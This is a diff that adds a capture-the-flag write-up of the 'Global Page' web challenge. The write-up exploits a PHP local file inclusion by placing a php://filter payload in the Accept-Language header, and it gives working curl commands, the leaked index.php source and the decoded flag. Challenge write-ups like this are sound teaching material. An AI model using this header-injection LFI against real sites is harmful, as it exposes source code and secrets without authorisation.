@@ -11,6 +11,84 @@ Trying to follow ctf or tokyo, the browser makes a GET request to a php as param
 ![Page](images/page.png)
 
 Mh! Warning: include() => suggest with high probability a **LFI** attack.
+Before continue one consideration: the include function try to open a file in the page parameter directory with the language specified in the Accept-Language Header Request.
+
+Every LFI page parameter results in a correctly input sanity check(escape . and /).
+
+What can we do? Attach a LFI in the Accept-Language and build the properly LFI.
+
+`curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=index"` => `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=index` that encode the index.php in base64.
+
+Decode the base64 index.php and obtain:
+```
+<?php
+if (!defined('INCLUDED_INDEX')) {
+define('INCLUDED_INDEX', true);
+ini_set('display_errors', 1);
+include "flag.php";
+?>
+<!doctype html>
+<html>
+<head>
+<meta charset=utf-8>
+<title>Global Page</title>
+<style>
+.rtl {
+  direction: rtl;
+}
+</style>
+</head>
+
+<body>
+<?php
+$dir = "";
+if(isset($_GET['page'])) {
+	$dir = str_replace(['.', '/'], '', $_GET['page']);
+}
+
+if(empty($dir)) {
+?>
+<ul>
+	<li><a href="/?page=tokyo">Tokyo</a></li>
+	<li><del>Westerns</del></li>
+	<li><a href="/?page=ctf">CTF</a></li>
+</ul>
+<?php
+}
+else {
+	foreach(explode(",", $_SERVER['HTTP_ACCEPT_LANGUAGE']) as $lang) {
+		$l = trim(explode(";", $lang)[0]);
+?>
+<p<?=($l==='he')?" class=rtl":""?>>
+<?php
+		include "$dir/$l.php";
+?>
+</p>
+<?php
+	}
+}
+?>
+</body>
+</html>
+<?php
+}
+?>
+```
+
+_include "flag.php"_, so one more time LFI:
+`curl 'http://globalpage.chal.ctf.westerns.tokyo/?page=php:' -H "Accept-Language:/filter/convert.base64-encode/resource=flag"` => `http://globalpage.chal.ctf.westerns.tokyo/?page=php://filter/convert.base64-encode/resource=flag`.
+
+Decode base64 and woitlà:
+
+```pirate$ echo "PD9waHAKJGZsYWcgPSAiVFdDVEZ7SV9mb3VuZF9zaW1wbGVfTEZJfSI7Cg" | base64 -D -
+<?php
+	$flag = "TWCTF{I_found_simple_LFI}";
+```
+
+
+
+
+
 
 
 
